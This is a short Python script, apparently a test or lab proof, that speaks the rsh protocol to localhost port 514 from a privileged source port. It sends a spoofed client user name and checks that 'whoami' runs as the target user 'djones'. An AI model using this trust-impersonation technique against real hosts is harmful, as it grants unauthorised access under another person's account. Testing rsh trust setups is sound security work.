#!/usr/bin/env python3

LHOST = "localhost"
LPORT = 1023
RHOST = "localhost"
RPORT = 514

CLIENTUSER = "the-flying-dutchman"
TARGETUSER = "djones"

from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

with socket(AF_INET, SOCK_STREAM) as s:
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.connect((RHOST, RPORT))
    s.send(b'\0')
    s.send(f"{CLIENTUSER}\0{TARGETUSER}\0whoami\0".encode())
    assert s.recv(1) == b'\0'
    resp = s.recv(1024).decode().strip()
    assert resp == TARGETUSER
